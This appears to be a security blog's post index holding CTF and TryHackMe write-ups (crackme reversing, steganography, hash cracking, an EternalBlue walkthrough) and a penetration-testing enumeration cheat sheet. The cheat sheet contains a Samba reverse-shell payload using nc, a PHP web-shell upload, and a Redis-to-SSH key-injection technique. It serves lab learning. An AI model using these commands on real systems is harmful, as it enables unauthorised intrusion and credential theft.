to and used ROT13 and after that we find: the flag is 2j68yfhqlz It is pretty easy to see the flag but can you see it i took nearly 1 minute to encode this with ROT13 good luck in solving thatAwesome we found the flag and it’s 2j68yfhqlzIntroduction to Kali LinuxremoveDescription: I need to remove a file called secret in my home directory. which command should i useSolution: rm ~/secretDistributionDescription: Debian-based distribution with a collection of security and forensics tools. It features timely security updates, support for the ARM architectureThe flag without spacesSolution: KalilinuxLinuxcmd 101Description: This Challenge will help you understand essential commands in Linux OSEach point is linked to another point, connect the link and win the Flag!Solution: Hey don’t be a script kiddie atleast give a try to this challenge.Hash CrackingGuess The PasswordDescription:A hacker leaked the below hash online.Can you crack it to know the password of the CEO? the flag is the password Hash: 06f8aa28b9237866e3e289f18ade19e1736d809dSolution: You can use hash identifier to know which hash we are cracking. You’ll find that the hash is sha1 and if you crack it you’ll get Password. You can use any tool to decode the sha1 hash and you will find hash is jrahyn+Introduction to Digital ForensicsCrime sceneDescription: Process of analyzing and investing computer devices, on suspecting that such devices may have been used in a cybercrimeFlag Format: XXXXXXXXXSolution:ForensicsSteganographyGreeksDescription: The art of hiding messages or information inside other image / text or dataSolution: SteganographyImages3cDescription: Securing an important image requires good encryption. so we added extra security layer for your photo and now is unbreakable!Solution:We shall use couple of tools to solve this challenge. I first used exiftool to check if the metadata└─$ exiftool cyber.jpgExifTool Version Number : 12.41File Name : cyber.jpgDirectory : .File Size : 212 KiBFile Modification Date/Time : 2020:03:27 15:03:20+03:00File Access Date/Time : 2022:08:08 16:36:07+03:00File Inode Change Date/Time : 2022:08:08 16:35:49+03:00File Permissions : -rw-r--r--File Type : JPEGFile Type Extension : jpgMIME Type : image/jpegJFIF Version : 1.01Resolution Unit : inchesX Resolution : 300Y Resolution : 300Image Width : 720Image Height : 720Encoding Process : Baseline DCT, Huffman codingBits Per Sample : 8Color Components : 3Y Cb Cr Sub Sampling : YCbCr4:2:0 (2 2)Image Size : 720x720Megapixels : 0.518Then I used steghide to extract if there is any file hidden on the image.└─$ steghide extract -sf cyber.jpg 1 ⨯Enter passphrase:steghide: could not extract any data with that passphrase!Well we have password. We have to brute force the password with stegcracker└─$ stegcracker cyber.jpgStegCracker 2.1.0 - (https://github.com/Paradoxis/StegCracker)Copyright (c) 2022 - Luke Paris (Paradoxis)StegCracker has been retired following the release of StegSeek, whichwill blast through the rockyou.txt wordlist within 1.9 second as opposedto StegCracker which takes ~5 hours.StegSeek can be found at: https://github.com/RickdeJager/stegseekNo wordlist was specified, using default rockyou.txt wordlist.Counting lines in wordlist..Attacking file 'cyber.jpg' with wordlist '/usr/share/wordlists/rockyou.txt'..Successfully cracked file with password: 1234Tried 1973 passwordsYour file has been written to: cyber.jpg.out1234We have the password as 1234 and the content hidden on the file was extracted. Now all we have to do is read the cyber.jpg.out.Awesome we have the flag.└─$ cat cyber.jpg.outflag{cyb3rs3cisaw3s0me}I love musicDescription: listen and focus , you will listen another thingFlag format : XXX_XXX_XXXXXXXXXXXSolution:This challenge was some how tricky at first but after a some tries I managed to solve it.we shall download the audio file└─$ wget https://s3-eu-west-1.amazonaws.com/hubchallenges/Forensics/love-music.wavThe next task is to download audacity and if you are on linux it’s fairly easy.└─$ sudo apt install audacityOnce you have downloaded audacity, import the downloaded file love-music.wav to audacity.Change audacity settings to spectrogram and you will see the flag there.Awesome!! flag: you_are_victorious!" }, { "title": "Reversing ELF", "url": "/posts/Reverse_elf/", "categories": "Tryhackme, Easy", "tags": "r2, radare2, assembly, ltrace, base64", "date": "2022-08-05 00:00:00 +0300", "snippet": " Hey remember that I’ll have to change the flag so that you can try it and find the actual flag. You can find the challenges here.Crackme1This was one of the easiest crackme challenges. All you ha...", "content": " Hey remember that I’ll have to change the flag so that you can try it and find the actual flag. You can find the challenges here.Crackme1This was one of the easiest crackme challenges. All you have to do is change the file to be an executable: chmod +x crackme1Now if you run it you will find the flag└─$ ./crackme1 flag{I have removed flag}Crackme2Once you have downloaded the binary file and changed the permissions to executable we can now start reversing it.We are going to try and run the elf file.└─$ ./crackme2 Usage: ./crackme2 passwordWell it seems we have to put password just after the elf.└─$ ./crackme2 test Access denied.We can see we don’t have the right password. We would use ltrace so as we can check if the password is being compared to a certain string.└─$ ltrace ./crackme2 test__libc_start_main(0x804849b, 2, 0xfff88504, 0x80485c0 &lt;unfinished ...&gt;strcmp(\"test\", \"super_secret_password\") = -1puts(\"Access denied.\"Access denied.) = 15+++ exited (status 1) +++“Test” is being compared to “super_secret_password” meaning that’s the actual password being compared to. Now let’s run it with the actual password└─$ ./crackme2 super_secret_password Access granted. flag{I have removed flag}Nice it gives us the flag.Crackme3On this challenge we shall do some recon on the file which we were given. We shall check if there are any strings on the file by using string command└─$ strings crackme3 /lib/ld-linux.so.2__gmon_start__libc.so.6_IO_stdin_usedputsstrlenmallocstderrfwritefprintfstrcmp__libc_start_mainGLIBC_2.0PTRhiD$$D$,;D$ UWVS[^_]Usage: %s PASSWORDmalloc failedZjByX3kwdXJfNWVjMG5kX2xlNTVvbl91bmJhc2U2NF80bGxfN2gzXzdoMW5nNQ==Correct password!Come on, even my aunt Mildred got this one!ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/;*2$\"8GCC: (Ubuntu/Linaro 4.6.3-1ubuntu5) 4.6.3.shstrtab.interp.note.ABI-tag.note.gnu.build-id.gnu.hash.dynsym.dynstr.gnu.version.gnu.version_r.rel.dyn.rel.plt.init.text.fini.rodata.eh_frame_hdr.eh_frame.ctors.dtors.jcr.dynamic.got.got.plt.data.bss.commentWe are able to see a base64 string which we shall decode it later. Let’s use Radare2 to check the strings.The first thing we shall do is open the file on radare2 and analyze it by using “aaaa”└─$ r2 crackme3 -- Add more blockchains to your life.[0x08048440]&gt; aaaa[x] Analyze all flags starting with sym. and entry0 (aa)[x] Analyze all functions arguments/locals[x] Analyze function calls (aac)[x] Analyze len bytes of instructions for references (aar)[x] Finding and parsing C++ vtables (avrr)[x] Type matching analysis for all functions (aaft)[x] Propagate noreturn information (aanr)[x] Finding function preludes[x] Enable constraint types analysis for variables[0x08048440]&gt;Once we have analyzed it we shall use iz which prints strings in data sections[0x08048440]&gt; iz[Strings]nth paddr vaddr len size section type string―――――――――――――――――――――――――――――――――――――――――――――――――――――――0 0x00000e68 0x08048e68 19 20 .rodata ascii Usage: %s PASSWORD\\n1 0x00000e7c 0x08048e7c 14 15 .rodata ascii malloc failed\\n2 0x00000e8b 0x08048e8b 64 65 .rodata ascii ZjByX3kwdXJfNWVjMG5kX2xlNTVvbl91bmJhc2U2NF80bGxfN2gzXzdoMW5nNQ==3 0x00000ed0 0x08048ed0 17 18 .rodata ascii Correct password!4 0x00000ef0 0x08048ef0 43 44 .rodata ascii Come on, even my aunt Mildred got this one!5 0x00000f1c 0x08048f1c 64 65 .rodata ascii ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/[0x08048440]&gt;We are able to get the same base64 string on the executable file.The next thing we shall do is to decode the base64 string.└─$ echo \"ZjByX3kwdXJfNWVjMG5kX2xlNTVvbl91bmJhc2U2NF80bGxfN2gzXzdoMW5nNQ==\" | base64 -d{I have removed flag}Crackme4On this challenge we are provides an elf file which it’s interesting because if we run the file we are somehow given hint.└─$ ./crackme4 Usage : ./crackme4 passwordThis time the string is hidden and we used strcmpSo let’s try and supply it with a password└─$ ./crackme4 testpassword \"test\" not OKBecause we have some hint that it uses strcmp to compare the actual password and the one you supplied it, let us use ltrace.└─$ ltrace ./crackme4 test __libc_start_main(0x400716, 2, 0x7ffe8ee36218, 0x400760 &lt;unfinished ...&gt;strcmp(\"my_m0r3_secur3_pwd\", \"test\") = -7printf(\"password \"%s\" not OK\\n\", \"test\"password \"test\" not OK) = 23+++ exited (status 0) +++Well we can see it is comparing my_m0r3_secur3_pwd to test meaning my_m0r3_secur3_pwd is the correct password.Now running the binary with the password which we have found it gives us the password OK message meaning we are right.└─$ ./crackme4 my_m0r3_secur3_pwdpassword OKCrackme5By now I think it’s becoming easier and easier. So let’s have a look at crackme5 binary file. Let’s start by seeing if there is any strings on the binary by using strings. Well we ain’t lucky this time because their is no unusual string. By running the binary file normal with unknown input it gives us “Always dig deeper”Now we shall run the elf using ltrace to see if the input is being compared to a string.└─$ ltrace ./crackme5__libc_start_main(0x400773, 1, 0x7ffdb0898aa8, 0x4008d0 &lt;unfinished ...&gt;puts(\"Enter your input:\"Enter your input:) = 18__isoc99_scanf(0x400966, 0x7ffdb0898960, 0, 0x7ffbcdfbe603test) = 1strlen(\"test\") = 4strlen(\"test\") = 4strlen(\"test\") = 4strlen(\"test\") = 4strlen(\"test\") = 4strncmp(\"test\", \"OfdlDSA|3tXb32~X3tX@sX`4tXtz\", 28) = 37puts(\"Always dig deeper\"Always dig deeper) = 18+++ exited (status 0) +++As you can see it is comparing test with OfdlDSA|3tXb32~X3tX@sX`4tXtz so let’s try and use that as our input.└─$ ./crackme5Enter your input:OfdlDSA|3tXb32~X3tX@sX`4tXtzGood gameWell game over we are in. OfdlDSA|3tXb32~X3tX@sX`4tXtz is the actual input being required.Crackme6We would start off by basic recon which is searching through the strings to check if we have something juicy. I think we are unlucky once again. So we shall use ltrace to see if their is string comparison happening.└─$ ltrace ./crackme6 test __libc_start_main(0x400711, 2, 0x7ffc9bdb22b8, 0x400760 &lt;unfinished ...&gt;printf(\"password \"%s\" not OK\\n\", \"test\"password \"test\" not OK) = 23+++ exited (status 0) +++Well once again we are unlucky so we need to decompile the file using radare2 to see what’s happening.Once you have opened and analyzed using aaa we would list all the function by afl. There is main function so we would seek to main function by s main and print assembly of main function by pdf.We can see sym.compare_pwd is being called.0x0040074c 4889c7 mov rdi, rax ; int64_t arg10x0040074f e87dffffff call sym.compare_pwdWe would seek to sym.compare_pwd and print assembly of compare_pwd function and see what’s going on there.0x004006dd 488b45f8 mov rax, qword [var_8h]0x004006e1 4889c7 mov rdi, rax ; int64_t arg10x004006e4 e894feffff call sym.my_secure_testAnother function is being called and that’s my_secure_test. We shall seek to my_secure_test and print the assembly of that function.You will notice it is comparing on the al register0x00400594 0fb600 movzx eax, byte [rax]0x00400597 3c31 cmp al, 0x31We shall manually take the hex value which compares to the one stored on al register which are: (0x31, 0x33, 0x33, 0x37, 0x5f, 0x70, 0x77, 0x64)Now we have to convert the hex values to their corresponding strings. On this case let’s keep everything as beginner friendly as we can. So we shall still use radare2 to convert but also you can use a simple python scriptAppend a question mark before the hex and it would convert it to different format. We shall grab the string because that’s what we want.[0x0040057d]&gt; ? 0x31int32 49uint32 49hex 0x31octal 061unit 49segment 0000:0031string \"1\" &lt;-----take this valuefvalue 49.0float 0.000000fdouble 0.000000binary 0b00110001ternary 0t1211[0x0040057d]&gt;Take the values one after the other till 0x64[0x0040057d]&gt; ? 0x64int32 100uint32 100hex 0x64octal 0144unit 100segment 0000:0064string \"d\"fvalue 100.0float 0.000000fdouble 0.000000binary 0b01100100ternary 0t10201Well… Again you can automate this process by using python.If you noticed we would be having 1337_pwd as our password. Try running with it and you’ll have solved the challenge.└─$ ./crackme6 1337_pwd password OKCrackme7Once you have the elf we can run it to as intended so as we can know what the program is supposed to do.└─$ ./crackme7 Menu:[1] Say hello[2] Add numbers[3] QuitAs we can see you are required to choose one of the three numbers. Well let’s run the program on Radare2 so as we can have deep understanding of the program.r2 crackme7-- A git pull a day keeps the segfault away[0x080483c0]&gt; aaa[x] Analyze all flags starting with sym. and entry0 (aa)[x] Analyze all functions arguments/locals[x] Analyze function calls (aac)[x] Analyze len bytes of instructions for references (aar)[x] Finding and parsing C++ vtables (avrr)[x] Type matching analysis for all functions (aaft)[x] Propagate noreturn information (aanr)[x] Use -AA or aaaa to perform additional experimental analysis.[0x080483c0]&gt;Seek on the main function and you will see there is a comparison and if it is true it would call a function which prints the flag.0x08048665 3d697a0000 cmp eax, 0x7a69│ ││││ │╭─&lt; 0x0804866a 7517 jne 0x8048683│ ││││ ││ 0x0804866c 83ec0c sub esp, 0xc│ ││││ ││ 0x0804866f 68bc880408 push str.Wow_such_h4x0r_ ; 0x80488bc ; \"Wow such h4x0r!\" ; const char *s│ ││││ ││ 0x08048674 e8f7fcffff call sym.imp.puts ; int puts(const char *s)│ ││││ ││ 0x08048679 83c410 add esp, 0x10│ ││││ ││ 0x0804867c e825000000 call sym.giveFlageaxis being compared to 0x7a69 which is a hex value. If you convert it to decimal you will find it is 31337. Going back to the program and using 31337 instead of 1,2 or 3 it would display the flag.└─$ ./crackme7 105 ⨯Menu:[1] Say hello[2] Add numbers[3] Quit[&gt;] 31337Wow such h4x0r!flag{I have removed flag}Crackme8This one of the best challenges in this series of challenges.We are given an elf file which we have to reverse it. We would start by seeing if we can get something juicy by using strings. Well we don’t have anything which can help us there.Let’s use ltrace to see if the program compares the input we give with any hard coded string.└─$ ltrace ./crackme8 test__libc_start_main(0x804849b, 2, 0xff9efb94, 0x80485c0 &lt;unfinished ...&gt;atoi(0xff9f01be, 0xff9efb94, 0xff9efba0, 0x80485e1) = 0puts(\"Access denied.\"Access denied.) = 15+++ exited (status 1) +++Once again it doesn’t.We shall open it with Radare2 and analyze then seek to main function.─$ r2 crackme8 -- Beer in mind.[0x080483a0]&gt; aaaaaa[x] Analyze all flags starting with sym. and entry0 (aa)[x] Analyze all functions arguments/locals[x] Analyze function calls (aac)[x] Analyze len bytes of instructions for references (aar)[x] Finding and parsing C++ vtables (avrr)[x] Type matching analysis for all functions (aaft)[x] Propagate noreturn information (aanr)[x] Finding function preludes[x] Enable constraint types analysis for variables[0x080483a0]&gt; s mainFrom here, their are two ways to solve the challengei) Method 1set a break point on this address0x080484e4 i.e db 0x080484e4.You can start by using ood test then dc to continue. On that address eax is being compared to 0xcafef00d then jumps to 0x80485020x080484e4 3d0df0feca cmp eax, 0xcafef00d0x080484e9 7417 je 0x8048502So we can set eip to 0x8048502 meaning we have jumped the comparison happening on 0x080484e9[0xf7f12070]&gt; dchit breakpoint at: 0x80484e4To change the eip register we shall use dr eip=0x8048502[0x080484e4]&gt; dr eip=0x080485020x080484e4 -&gt;0x08048502So continue to run the program and you will notice we have bypassed the comparison and now it prints the flag.[0x080484e4]&gt; dcAccess granted.flag{I have removed flag}(25658) Process exited with status=0x0[0xf7f0f559]&gt;ii) Method 2We shall set a breakpoint on the same address which is 0x080484e4Now rather than us jumping to 0x8048502 we shall edit the value of eax register to 0xcafef00d[0xf7f00070]&gt; dchit breakpoint at: 0x80484e4[0x080484e4]&gt; dreax = 0x00000000ebx = 0x00000000ecx = 0xff93418fedx = 0x0000001desi = 0x00000002edi = 0x080483a0esp = 0xff933b50ebp = 0xff933b58eip = 0x080484e4eflags = 0x00000286oeax = 0xffffffff[0x080484e4]&gt;To change the eax register we shall use dr eax=0xcafef00d and now when we print all the registers, eax has been changed.[0x080484e4]&gt; dreax = 0xcafef00debx = 0x00000000ecx = 0xff93418fedx = 0x0000001desi = 0x00000002edi = 0x080483a0esp = 0xff933b50ebp = 0xff933b58eip = 0x080484e4eflags = 0x00000286oeax = 0xffffffff[0x080484e4]&gt;Register eax is being compared to 0xcafef00d which it’s true and it prints the flag.[0x080484e4]&gt; dcAccess granted.flag{I have removed flag}(25951) Process exited with status=0x0[0xf7efd559]&gt;Well this was fun…" }, { "title": "Enumeration/Scanning", "url": "/posts/Enumeration/", "categories": "Cheat sheet", "tags": "nmap, ftp, ssh, telnet, smtp, dns, dnsenum, rpc, smb, snmp, irc, mysql, redis", "date": "2022-04-25 00:00:00 +0300", "snippet": "This is the second phase of hacking where by it includes scanning the target and enumerating services.Port Scanning :1. nmap -sC -sV -o nmap -A -T5 10.10.10.x2. Host Discovery • nmap -sn 10.10.1...", "content": "This is the second phase of hacking where by it includes scanning the target and enumerating services.Port Scanning :1. nmap -sC -sV -o nmap -A -T5 10.10.10.x2. Host Discovery • nmap -sn 10.10.1.1-254 -vv -oA hosts • netdiscover -r 10.10.10.0/24 3. DNS server discovery • nmap -p 53 10.10.10.1-254 -vv -oA dcs 4. NSE Scripts Scan * nmap -sV --script=vulscan/vulscan.nse (https://securitytrails.com/blog/nmap-vulnerability-scan) 5. Port specific NSE script list : ls /usr/share/nmap/scripts/ssh* ls /usr/share/nmap/scripts/smb*TCP ScanningTo illustrate this, we will run a TCP Netcat port scan on ports 3388-3390. The -w option specifies the connection timeout in seconds and -z is used to specify zero-I/O mode, which will send no data and is used for scanning:nc -nvv -w 1 -z &lt;IP&gt; 3388-3390UDP ScanningLet’s run a UDP Netcat port scan against ports 160-162 on a target. This is done using the only nc option -u, which indicates a UDP scan:nc -nv -u -z -w 1 &lt;IP&gt; 160-162nmap -sU TARGETMost UDP scanners tend to use the standard “ICMP port unreachable” message to infer the status of a target port. However, this method can be completely unreliable when the target port is filtered by a firewall. In fact, in these cases the scanner will report the target port as open because of theabsence of the ICMP message.Scanning all 65535 ports :1. masscan -p1-65535,U:1-65535 --rate=1000 10.10.10.x -e tun0 &gt; portsports=$(cat ports | awk -F \" \" '{print $4}' | awk -F \"/\" '{print $1}' | sort -n | tr '\\n' ',' | sed 's/,$//')2. nmap -Pn -sV -sC -p$ports 10.10.10.x3. Running specific NSE scripts : nmap -Pn -sC -sV --script=vuln*.nse -p$ports &lt;IP&gt; -T5 -AFTP : (Port 21)1. anonymous login check. ftp &lt;ip address&gt; username : anonymous pwd : anonymous file upload -&gt; put shell.phpSSH : (Port 22)id_rsa.pub : Public key that can be used in authorized_keys for loginid_rsa : Private key that is used for login. Password can be cracked with ssh2john and johnid_rsassh -i id_rsa user@10.10.10.xFor passwordless login, add id_rsa.pub to target's authorized_keysssh2johnTelnet:(23) Banner Grab nc -vn &lt;IP&gt; 23 Using nmap scriptnmap -n -sV -Pn --script \"*telnet*\" -p 23 &lt;IP&gt;SMTP: (25,465(ssl),587(ssl)) Banner grabbingnc -vn &lt;IP&gt; 25 Using nmap scriptnmap -p25 --script smtp-commands &lt;IP&gt;nmap --script smtp-enum-users &lt;IP&gt; Other techniquesMetasploit: auxiliary/scanner/smtp/smtp_enumsmtp-user-enum: smtp-user-enum -M &lt;MODE&gt; -u &lt;USER&gt; -t &lt;IP&gt;DNS Zone transfer check : (Port 53)If port 53 is open:1. Add host to /etc/hosts2. dig axfr smasher.htb @10.10.10.135 https://ghostphisher.github.io/smasher23. Add the extracted domain to /etc/hosts and dig again DnsreconRunning dnsrecon against target.com using the -d option to specify a domain name, and -t to specify the type of enumeration to perform dnsrecon -d &lt;target.com&gt; -t axfr Brute forcing using dnsreconWe will use the -d option to specify a domain name, -D to specify a file name containing potential subdomain strings, and -t to specify the type of enumeration to perform (in this case brt for brute force): dnsrecon -d &lt;target.com&gt; -D ~/list.txt -t brt DNSenum dnsenum &lt;target.com&gt; using nmapnmap --script=dns-zone-transfer -p 53 &lt;target's ns&gt;RPC Bind (111)rpcclient --user=\"\" --command=enumprivs -N &lt;IP&gt;rpcinfo –p &lt;IP&gt;rpcbind -p &lt;IP&gt; RPC (135)rpcdump.py &lt;IP&gt; -p 135rpcdump.py &lt;IP&gt; -p 135 | grep ncacn_np // get pipe namesrpcmap.py ncacn_ip_tcp:&lt;IP&gt;[135]SMB (139 &amp; 445)https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html1. nmap --script smb-protocols &lt;IP&gt; nmap -v -p 139,445 -oG smb.txt 192.168.11.200-2542.smbclient -L //&lt;IP&gt;3. smbclient -L //&lt;IP&gt; -N // No password (SMB Null session)4. smbclient //MOUNT/share -I target -N5. smbclient --no-pass -L &lt;IP&gt;6. smbclient //&lt;IP&gt;/share_name7 smbmap -H &lt;IP&gt;8. smbmap -H &lt;IP&gt; -u '' -p ''9. smbmap -H &lt;IP&gt; -s share_name 10. crackmapexec smb &lt;IP&gt; -u '' -p '' --shares11. crackmapexec smb &lt;IP&gt; -u 'sa' -p '' --shares12. crackmapexec smb &lt;IP&gt; -u 'sa' -p 'sa' --shares13. crackmapexec smb &lt;IP&gt; -u '' -p '' --share share_name14. crackmapexec smb 192.168.0.115 -u '' -p '' --shares --pass-pol15.enum4linux -a &lt;IP&gt;16. rpcclient -U \"\" &lt;IP&gt; * enumdomusers * enumdomgroups * queryuser [rid] * getdompwinfo * getusrdompwinfo [rid]17. ncrack -u username -P rockyou.txt -T 5 &lt;IP&gt; -p smb -v18. mount -t cifs \"//&lt;IP&gt;/share/\" /mnt/wins19. mount -t cifs \"//&lt;IP&gt;/share/\" /mnt/wins -o vers=1.0,user=root,uid=0,gid=020. SMB Shell to Reverse Shell : smbclient -U \"username%password\" //&lt;IP&gt;/sharename smb&gt; logon “/=nc &lt;IP&gt; 4444 -e /bin/bash\" Checklist : * Samba symlink directory traversal attack Fingerprint SMB Version smbclient -L //&lt;IP&gt; Find open SMB Shares nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=username,smbpass=password -p445 192.168.1.0/24 Enumerate SMB Usersnmap -sU -sS --script=smb-enum-users -p U:137,T:139 192.168.11.200-254 List sharessmbmap -H [ip/hostname]echo exit | smbclient -L \\\\\\\\[ip]nmap --script smb-enum-shares -p 139,445 &lt;IP&gt; Check for null sessionssmbmap -H [ip/hostname]rpcclient -U \"\" -N &lt;IP&gt;smbclient \\\\\\\\[ip]\\\\[share name] SMB Exploits : Samba “username map script” Command Execution - CVE-2007-2447 Version 3.0.20 through 3.0.25rc3 Samba-usermap-exploit.py - https://gist.github.com/joenorton8014/19aaa00e0088738fc429cff2669b9851 Eternal Blue - CVE-2017-0144 SMB v1 in Windows Vista SP2; Windows Server 2008 SP2 and R2 SP1; Windows 7 SP1; Windows 8.1; Windows Server 2012 Gold and R2; Windows RT 8.1; and Windows 10 Gold, 1511, and 1607; and Windows Server 2016https://github.com/adithyan-ak/MS17-010-Manual-Exploit SambaCry - CVE-2017-7494 4.5.9 version and before https://github.com/opsxcq/exploit-CVE-2017-7494 OTHER TOOLS nmblookup - collects NetBIOS over TCP/IP client used to lookup NetBIOS names.smbclient- an ftp-like client to access SMB sharesnmap - general scanner, with scriptsrpcclient - tool to execute client side MS-RPC functionsenum4linux - enumerates various smb functionswiresharkSNMP (161)1. snmpwalk -c public -v1 &lt;IP&gt;2. snmpcheck -t &lt;IP&gt; -c public3. onesixtyone -c names -i hosts4. nmap -sT -p 161 &lt;IP&gt; -oG snmp_results.txt5. snmpenum -t &lt;IP&gt;IRC (194,6667,6660-7000)1. nmap -sV --script irc-botnet-channels,irc-info,irc-unrealircd-backdoor -p 194,6660-7000 irked.htb2. https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor (exploit code)1. NFS (2049)2. showmount -e &lt;IP&gt;3. mkdir /mnt/nfs4. mount -t nfs &lt;IP&gt;:/nfspath-shown /mnt/nfs5. Permission Denied ? (https://blog.christophetd.fr/write-up-vulnix/)MYSQL (3306) nmap -sV -Pn -vv &lt;IP&gt; -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 Redis (6379)In the output of config get * you could find the home of the redis user (usually /var/lib/redis or /home/redis/.ssh), and knowing this you know where you can write the authenticated_users file to access via ssh with the user redis. If you know the home of other valid user where you have writable permissions you can also abuse it: Generate a ssh public-private key pair on your pc: ssh-keygen -t rsa Write the public key to a file : (echo -e “\\n\\n”; cat ./.ssh/id_rsa.pub; echo -e “\\n\\n”) &gt; foo.txt Import the file into redis : cat foo.txt redis-cli -h 10.10.10.10 -x set crackit Save the public key to the authorized_keys file on redis server:root@Urahara:~# redis-cli -h &lt;IP&gt;10.85.0.52:6379&gt; config set dir /home/test/.ssh/OK10.85.0.52:6379&gt; config set dbfilename \"authorized_keys\"OK10.85.0.52:6379&gt; saveOKPort Knocking :TCPknock -v &lt;ip&gt; 4 27391 159UDPknock -v &lt;IP&gt; 4 27391 159 -uTCP &amp; UDPknock -v &lt;IP&gt; 159:udp 27391:tcp 4:udpOTHER TECHNIQUES IP DISCOVERY netdiscover -r 10.0.2.0/24nmap -sP 10.195.0.0/16 // ping discovery scan connect to a UDP portnc -u localhost 161 WINDOWSsearch for filesC:\\&gt; dir /s /b network-secret.txt Finding files Find SUID files ---&gt; find / -perm -4000 -type f 2&gt;/dev/nullFind SUID files owned by root ---&gt; find / -uid 0 -perm -4000 -type f 2&gt;/dev/null Find files with GUID bit set ---&gt; find / -perm -2000 -type f 2&gt;/dev/null Find world-writable files ---&gt; find / -perm -2 -type f 2&gt;/dev/null Find word-writable directories ---&gt; find / -perm -2 -type d 2&gt;/dev/null Find rhost config files ---&gt; find /home –name .rhosts -print 2&gt;/dev/null list files recursively ---&gt; ls -ahlR /root/ PHPRead PHP source code with php://filter http://&lt;IP&gt;/?page=upload // original pagehttp://&lt;IP&gt;/?page=php://filter/convert.base64-encode/resource=uploadcurl http://&lt;IP&gt;/?page=php://filter/convert.base64-encode/resource=upload The result needs to be decoded from Base64 Other recourses can be found here https://github.com/R0B1NL1N/OSCP-note/blob/master/ENUMERATION/enumeration" }, { "title": "BLUE", "url": "/posts/Blue/", "categories": "Tryhackme, Easy", "tags": "metasploit, eternal blue, nmap", "date": "2021-08-28 00:00:00 +0300", "snippet": " This was my first write-up which I posted on Medium on Aug 28, 2021.Hello Everyone!I’m Collins, a security researcher. This is an article on how to exploit blue a machine on TryHackMe made by Dar...", "content": " This was my first write-up which I posted on Medium on Aug 28, 2021.Hello Everyone!I’m Collins, a security researcher. This is an article on how to exploit blue a machine on TryHackMe made by DarkStar7471.Title pageDEPLOYING THE MACHINETo connect to TryHackMe you will need to download the OpenVpn and connect to their VPN. Once connected to their VPN start the machine and we are ready to exploit it. Once you have deployed the machine you would be given an IP address and one hour time (but you can add one hour) as shown in the figure bellow.fig 1.0TASK 1: RECONWe shall start our recon by scanning the machine. The command we shall use is nmap -sV -A &lt;TARGET_IP&gt;fig 2.0We can manually count the number of ports under 1000 on our nmap scan which is 3.To know what is this machine vulnerable to we shall run nmap &lt;TARGET_IP&gt;-script vuln and the result should like as figure 3.0fig 3.0As we can clearly see the target is vulnerable to ms17–010TASK 2: GAINING ACCESSNow the fun part is here where we shall gain full access to our target.The first thing to do is to launch Metasploit. This is done by writing msfconsole to the terminal as in figure 4.0fig 4.0Now we shall use the search feature to search for ms17_010_ which we had earlier found that the target is vulnerable to. The full path of the exploit as found on the search is exploit/windows/smb/ms17_010_eternalblue as shown in the figure 5.0fig 5.0Use the show options and see what is required.Set RHOST to your target IP.(shown in figure 6.0)fig 6.0With that done, run the exploit…fig 6.1We have to background the shell by CTRL + Z or by typing background.fig 6.2TASK 3: ESCALATEAlright, it’s now time to upgrade our shell to meterpreter. We shall find our upgrade module by searching for shell_to_meterpreter as shown in figure 7.1fig 7.0Select the post/multi/manage/shell_to_meterpreter by the use of use command as in figure 7.1fig 7.1Set LHOST &lt;Your_IP&gt;fig 7.2We use sessions -i command to see the current sessionfig 7.3We shall use the run command to get the meterpreter shell.Once again use the sessions -i command to see the current session and you’ll notice we have meterpreter shell as in figure 7.4fig 7.4Now we shall use set SESSION 2 and start interaction with it.fig 7.5Since we have already connected through a meterpreter session to the target machine we can escalate privileges by the using the command getsystem. Use the shell command and run whoami then background the session.List all the process by the command ps and migrate to a process that is running at NT AUTHORITY\\SYSTEMTo migrate we can use migrate -N (name_of_the_process) OR migrate -P (process_ID)TASK 4: CRACKINGWith our elevated meterpreter shell, run the command hashdump which will dump all of the passwords on the machine as long as we have the correct privileges.TASK 5: FINDING FLAGSFLAG 1Flag one is located on the root of the machine in which is C:/cat flag1.txtflag 1FLAG 2We shall search for sam location on windows which is C:\\Windows\\System32\\configcat flag2.txtflag 2FLAG 3We shall use the search function to search for flag3search -f flag*.txtcat c:\\\\Users\\\\Jon\\\\Documents\\\\flag3.txt#THANKS" } ]
